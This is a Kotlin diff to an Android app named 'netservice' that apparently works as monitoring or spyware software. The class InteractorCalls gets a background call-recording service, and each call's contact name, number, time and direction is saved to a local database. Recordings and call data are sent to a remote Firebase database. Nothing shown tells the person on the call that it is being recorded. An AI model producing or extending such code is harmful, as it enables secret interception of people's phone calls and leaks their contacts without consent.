@@ -5,16 +5,17 @@ import android.media.MediaRecorder
 import android.net.Uri
 import android.os.Environment
 import android.os.Handler
+import com.aykuttasil.callrecord.CallRecord
 import com.dtz.netservice.data.model.Calls
 import com.dtz.netservice.rxFirebase.InterfaceFirebase
 import com.dtz.netservice.services.base.BaseInteractorService
 import com.dtz.netservice.utils.CallLogs
-import com.dtz.netservice.utils.ConstFun.getDateTime
 import com.dtz.netservice.utils.ConstFun.isAndroidM
 import com.dtz.netservice.utils.Consts
 import com.dtz.netservice.utils.Consts.ADDRESS_AUDIO_CALLS
 import com.dtz.netservice.utils.Consts.CALLS
 import com.dtz.netservice.utils.Consts.DATA
+import com.dtz.netservice.utils.DataBaseHelper
 import com.dtz.netservice.utils.FileHelper.getContactName
 import com.dtz.netservice.utils.FileHelper.getDurationFile
 import com.dtz.netservice.utils.FileHelper.getFileNameCall
@@ -40,28 +41,32 @@ class InteractorCalls<S : InterfaceServiceCalls> @Inject constructor(
     private var type: Int = 0
     private var dateTime: String? = null
 
+    private val db = DataBaseHelper(context)
+
     override fun startRecording(phoneNumber: String?, type: Int) {
 
+        val currentTimeMillis = System.currentTimeMillis()
         this.type = type
         this.phoneNumber = phoneNumber
-        dateTime = getDateTime()
+        dateTime = currentTimeMillis.toString() //getDateTime()
         contact = getContext().getContactName(phoneNumber)
         fileName = getContext().getFileNameCall(phoneNumber, dateTime)
-
-        if (isAndroidM()) recorder.startRecording(
+        startRecordingService()
+        /*if (isAndroidM()) recorder.startRecording(
             MediaRecorder.AudioSource.VOICE_COMMUNICATION,
             fileName
         )
-        else recorder.startRecording(MediaRecorder.AudioSource.VOICE_CALL, fileName)
+        else recorder.startRecording(MediaRecorder.AudioSource.VOICE_CALL, fileName)*/
 
     }
 
     override fun stopRecording() {
-        recorder.stopRecording { sendFileCall() }
+        sendFileCall()
+        //recorder.stopRecording { sendFileCall() }
         Handler().postDelayed({
             getRecordsLists(getContext())
             getCallLog(getContext())
-        }, 10000)
+        }, 15000)
     }
 
     private fun deleteFile() {
@@ -69,8 +74,33 @@ class InteractorCalls<S : InterfaceServiceCalls> @Inject constructor(
         if (getService() != null) getService()!!.stopServiceCalls()
     }
 
+    private fun startRecordingService() {
+        val callsFolder =
+            File(getContext().getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS), "records")
+        if (!callsFolder.exists()) {
+            callsFolder.mkdir()
+        }
+
+        val callRecord: CallRecord = CallRecord.Builder(getContext())
+            .setLogEnable(true)
+            .setRecordFileName("call")
+            .setRecordDirName("calls")
+            //.setRecordDirPath(Environment.getExternalStorageDirectory().path) // optional & default value
+            .setRecordDirPath(callsFolder.path) // optional & default value
+            .setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB) // optional & default value
+            .setOutputFormat(MediaRecorder.OutputFormat.AMR_NB) // optional & default value
+            .setAudioSource(MediaRecorder.AudioSource.VOICE_RECOGNITION) // optional & default value
+            .setShowSeed(true) // optional & default value ->Ex: RecordFileName_incoming.amr || RecordFileName_outgoing.amr
+            .build()
+
+        callRecord.startCallRecordService()
+    }
+
     private fun sendFileCall() {
-        Handler().postDelayed({
+        //val duration = getDurationFile(fileName!!)
+        val calls = Calls(contact, phoneNumber, dateTime, "0", type)
+        saveCallLog(calls)
+        /*Handler().postDelayed({
             val filePath = "${getContext().getFilePath()}/$ADDRESS_AUDIO_CALLS"
             val dateNumber = fileName!!.replace("$filePath/", "")
             val uri = Uri.fromFile(File(fileName))
@@ -80,12 +110,16 @@ class InteractorCalls<S : InterfaceServiceCalls> @Inject constructor(
                     .observeOn(AndroidSchedulers.mainThread())
                     .subscribe({ setPushName() }, { deleteFile() })
             )
-        }, 5000)
+
+        }, 5000)*/
     }
 
     private fun setPushName() {
         val duration = getDurationFile(fileName!!)
         val calls = Calls(contact, phoneNumber, dateTime, duration, type)
+
+        saveCallLog(calls)
+
         firebase().getDatabaseReference("$CALLS/$DATA").push().setValue(calls)
         //deleteFile()
     }
@@ -96,7 +130,8 @@ class InteractorCalls<S : InterfaceServiceCalls> @Inject constructor(
     }
 
     private fun getRecordsLists(context: Context) {
-        val callsDir = context.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS)?.path + "/records/calls/"
+        val callsDir =
+            context.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS)?.path + "/records/calls/"
         File(callsDir).walk().forEach {
             val file = File(it.path)
             if (file.isFile) {
@@ -125,6 +160,11 @@ class InteractorCalls<S : InterfaceServiceCalls> @Inject constructor(
         firebase().getDatabaseReference("recording_calls")
             .child(lastPathSegment)
             .updateChildren(callMap)
+    }
+
+    private fun saveCallLog(calls: Calls) {
+        //Call logs
+        db.insertCallLog(calls)
     }
 
 }
